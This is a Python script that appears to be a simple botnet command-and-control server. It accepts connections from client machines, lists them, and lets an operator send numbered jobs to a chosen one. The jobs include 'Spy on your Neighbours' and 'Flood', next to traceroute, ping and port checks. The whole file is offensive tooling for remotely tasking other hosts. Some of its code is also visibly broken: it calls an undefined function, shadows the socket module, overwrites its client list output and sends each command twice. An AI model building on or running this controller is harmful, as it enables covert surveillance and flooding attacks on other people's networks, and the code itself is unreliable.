import socket
import sys
import threading
import time
from queue import Queue
import sys
from socket import *
from scapy.all import *


numOfThreads = 2
jobNum = [1, 2]
queue = Queue()
Connections = []
allAdd = []


# Socket Created
def createSock():
    try:
        global serverName
        global serverPort
        global sock
        serverName = ""
        serverPort = 12000
        sock = socket.socket()

    except socket.error as msg:
        print("There was an error creating the socket: " + str(msg))


# Socket listening 
def bindSock():
    try:
        global serverName
        global serverPort
        global sock
        print("Port being binded: " + str(serverPort))

        sock.bind((serverName, serverPort))
        sock.listen(5)

    except socket.error as msg:
        print("There was an error binding the socket" + str(msg) + "\n" + "Trying Again...")
        bind_socket()


# Saving client connections to list. Closing them when server is terminated.

def acceptCon():
    for co in Connections:
        co.close()

    del Connections[:]
    del allAdd[:]

    while True:
        try:
            conn, address = sock.accept()
            sock.setblocking(1) 

            Connections.append(conn)
            allAdd.append(address)

            print("Connection is established: " + address[0])
            print("\n~Client Selection Commands~\n1)To show available clients type: list\n2)To select client type: select + client#")
        except:
            print("Error trying to accept the connections")


def start():

    while True:
        cmd = input('cmd> ')
        if cmd == 'list':
            conList()
        elif 'select' in cmd:
            conn = getTarg(cmd)
            if conn is not None:
                sendTargCmds(conn)

        else:
            print("The command entered wasn't recognized")


#client connections

def conList():
    results = ''

    for i, conn in enumerate(Connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del Connections[i]
            del allAdd[i]
            continue

        results = str(i) + "   " + str(allAdd[i][0]) + "   " + str(allAdd[i][1]) + "\n"

    print("\n~Available Clients~\n" + results)

    

def getTarg(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = Connections[target]
        print("You are now connected to: " + str(allAdd[target][0]))
        print("Type 'quit' to disconnect")
        print("~Job Menu~\nSelect #:\n1)Spy on your Neighbours\n2)Traceroute\n3)Ping\n4)Port Status\n5)Flood")
        print(str(allAdd[target][0]) + ">", end="")
        return conn


    except:
        print("Selection not valid")
        return None


#send jobs
def sendTargCmds(conn):
    while True:
        try:
            cmd = input()
            if cmd == '1':
                conn.send(str.encode(cmd))
            elif cmd == '2':
                conn.send(str.encode(cmd))
            elif cmd == '3':
                conn.send(str.encode(cmd))
            elif cmd == '4':
                conn.send(str.encode(cmd))
            elif cmd == '5':
                conn.send(str.encode(cmd))
            elif cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break



def createWorkers():
    for _ in range(numOfThreads):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()



def work():
    while True:
        x = queue.get()
        if x == 1:
            createSock()
            bindSock()
            acceptCon()
        if x == 2:
            start()

        queue.task_done()


def createJbs():
    for x in jobNum:
        queue.put(x)

    queue.join()


createWorkers()
createJbs()

